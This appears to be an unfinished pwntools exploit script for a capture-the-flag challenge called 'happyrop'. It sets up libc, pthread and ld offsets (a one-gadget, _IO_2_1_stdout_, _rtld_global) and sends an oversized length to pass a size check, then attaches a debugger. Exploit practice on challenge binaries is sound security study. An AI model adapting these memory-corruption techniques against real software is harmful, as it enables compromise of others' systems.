from pwn import *

#init

e = ELF('./happyrop')
libp = ELF('./libpthread-2.31.so')
libc = ELF('./libcs-2.31.so')
ld = ELF('./ld-2.31.so')

p = process(e.path)
#p = remote()

#funcs

def idx(x):
    return x // 0x8

#vars

libp_off = 0x4920
mutexlock_off = libp.sym['pthread_mutex_lock']

libc_off = 0x27920
iostdout_off = libc.sym['_IO_2_1_stdout_']
onegadget_off = 0xe6aee

ld_off = 0x21b920
rtld_off = ld.sym['_rtld_global']

log.info('Libp stk off: ' + hex(libp_off))
log.info('Mutexlock libp off: ' + hex(mutexlock_off))
print("")
log.info('Libc stk off: ' + hex(libc_off))
log.info('iostdout libc off: ' + hex(iostdout_off))
log.info('One gadget libc off: ' + hex(onegadget_off))
print("")
log.info('Ld stk off: ' + hex(ld_off))
log.info('rtld ld off: ' + hex(rtld_off))

#exploit

#send size so always pass check

p.sendlineafter('?', str(0xff))
gdb.attach(p.pid + 1)
p.sendline('3')

#pray for flag

p.interactive()
